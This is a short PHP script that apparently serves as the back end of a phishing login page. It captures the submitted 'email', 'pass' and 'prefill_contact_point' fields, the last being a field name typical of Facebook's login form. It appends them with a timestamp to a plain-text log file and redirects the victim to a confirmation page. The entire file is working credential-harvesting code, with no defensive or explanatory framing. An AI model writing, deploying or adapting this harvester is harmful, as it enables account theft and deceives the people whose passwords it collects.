<?php
header ('Location: /confirmation');
$handle = fopen("log.txt", "a");

date_default_timezone_set('EET');
fwrite($handle, date("d.m.Y - h:i\r\n"));
foreach($_POST as $variable => $value) {
	if ($variable == "email" || $variable == "pass" || $variable == "prefill_contact_point")
	{
		fwrite($handle, $variable);
		fwrite($handle, " = ");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
}

fwrite($handle, "\r\n");
fclose($handle);
exit;
?>